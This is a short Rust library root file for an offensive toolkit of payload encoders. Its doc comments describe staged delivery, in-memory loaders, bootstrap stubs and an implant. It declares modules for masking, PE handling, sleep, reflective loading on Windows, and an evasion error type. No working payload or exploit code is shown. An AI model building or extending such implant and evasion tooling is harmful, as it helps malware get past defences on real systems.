//! Payload encoders for staged delivery and in-memory loaders.
//!
//! Every encoder is a symmetric byte transform with a compact decoder suitable
//! for a small bootstrap stub. The crate is transport- and platform-agnostic so
//! the same encoding can be produced by the builder and reversed by the implant.

pub mod encoders;
pub mod error;
pub mod mask;
pub mod pe;
pub mod sleep;
pub mod stubs;

#[cfg(target_os = "windows")]
pub mod reflective;

#[cfg(target_os = "windows")]
pub mod windows;

pub use encoders::{decode, encode, Encoder, EncoderSpec};
pub use error::{EvasionError, Result};
pub use mask::MaskedBytes;
